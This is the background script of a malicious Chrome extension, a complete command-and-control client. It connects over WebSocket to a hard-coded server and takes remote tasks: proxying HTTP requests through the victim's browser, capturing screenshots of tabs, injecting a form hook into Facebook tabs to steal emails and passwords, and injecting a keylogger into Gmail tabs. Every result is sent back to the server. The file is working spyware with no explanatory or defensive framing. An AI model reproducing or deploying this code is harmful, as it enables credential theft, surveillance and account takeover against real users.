function base64toarray(data) {
	var byteString = atob(data);
    // write the bytes of the string to an ArrayBuffer
    var ab = new ArrayBuffer(byteString.length);
    var ia = new Uint8Array(ab);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    // write the ArrayBuffer to a blob, and you're done
    //var bb = new window.BlobBuilder();
    //bb.append(ab);
    //return bb.getBlob(mimeString);
    return ia;
}

function httpReq(url,method,headers,body)
{
    var xmlHttp = new XMLHttpRequest();    
    xmlHttp.open( method, url, false ); // false for synchronous request
	for (var p in headers) {
		if(headers.hasOwnProperty(p)) {
			xmlHttp.setRequestHeader(p, headers[p])
		}
	}  
	console.log(body);
	var data_array = base64toarray(body)
    xmlHttp.send(data_array);
    return xmlHttp;
}

(function() {
	console.log('Message recv');
	chrome.runtime.onMessage.addListener(function(message, sender, callback) {
		localStorage["data"] = message;
	});

	var connection = new WebSocket('ws://192.168.1.213/websocket/');
	connection.onopen = function(){
		console.log('Connection open!');
		connection.send("init "+ ID);
	}
	connection.onclose = function(){
		console.log('Connection closed');
	}
	connection.onerror = function(error){
		console.log('WS Error detected: ' + error);
	}
	connection.onmessage = function(e){
		var msg = JSON.parse(e.data);
		console.log("SERVER: " + JSON.stringify(msg));
		if(msg['task_cmd']==="TASK_PIVOT")
		{
			var url = msg['data']['url'];
			var headers = msg['data']['headers'];
			var method = msg['data']['method'];
			var body = msg['data']['body']
			var response = httpReq(url, method, headers,body);
			var response_obj = new Object();
			response_obj.id = msg['id'];
			response_obj.status = response.status;
			response_obj.text = btoa(unescape(encodeURIComponent(response.responseText)));
			connection.send(JSON.stringify(response_obj));
		}
		else if(msg['task_cmd']==="TASK_SCREENCAP")
		{
			chrome.tabs.captureVisibleTab(null, function(img) {
		        var response_obj = new Object();
		        response_obj.id = msg['id'];
				response_obj.status = 200;
				response_obj.text = btoa(unescape(encodeURIComponent(img.toString())));
				connection.send(JSON.stringify(response_obj));
		    });

		}
		else if(msg['task_cmd']==="TASK_FORMCAP")
		{
		    var hook_js = 'for (var i = 0; i < document.forms.length; i++) {document.forms[i].addEventListener("submit", function(){console.log("submit event");var data = [this.elements["email"].value, this.elements["pass"].value];chrome.runtime.sendMessage(data.join(", "));});console.log("hook inserted on form");}';
		    localStorage["data"] = "[]";
		    queryInfo = {
		        'url': '*://www.facebook.com/*'
		    };

		    chrome.tabs.query(queryInfo, function (result) {
		        for (i = 0; i < result.length; i++) {    
		            chrome.tabs.executeScript(result[i].id, {
		                code: hook_js
		            });
		            console.log("injected script");
		        }
		    });

		    setTimeout(function(){ 
		    	var response_obj = new Object();
		        response_obj.id = msg['id'];
				response_obj.status = 200;
				response_obj.text = btoa(unescape(encodeURIComponent(localStorage["data"])));
				console.log("sending response");
				connection.send(JSON.stringify(response_obj));
		    }, 20000);

		}
		else if(msg['task_cmd']==="TASK_KEYLOG")
		{
		    var kl_js = 'var keys=\'\';document.onkeypress = function(e){get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys+=key;};setTimeout(function(){chrome.runtime.sendMessage(keys);}, 15000);';
		    localStorage["data"] = "[]";
		    queryInfo = {
		        'url': '*://mail.google.com/*'
		    };

		    chrome.tabs.query(queryInfo, function (result) {
		        for (i = 0; i < result.length; i++) {    
		            chrome.tabs.executeScript(result[i].id, {
		                code: kl_js
		            });
		            console.log("injected script");
		        }
		    });

		    setTimeout(function(){ 
		    	var response_obj = new Object();
		        response_obj.id = msg['id'];
				response_obj.status = 200;
				response_obj.text = btoa(unescape(encodeURIComponent(localStorage["data"])));
				console.log("sending response");
				connection.send(JSON.stringify(response_obj));
		    }, 20000);


		}
		else
		{
			console.log("Task Error");
		}
	}
})();



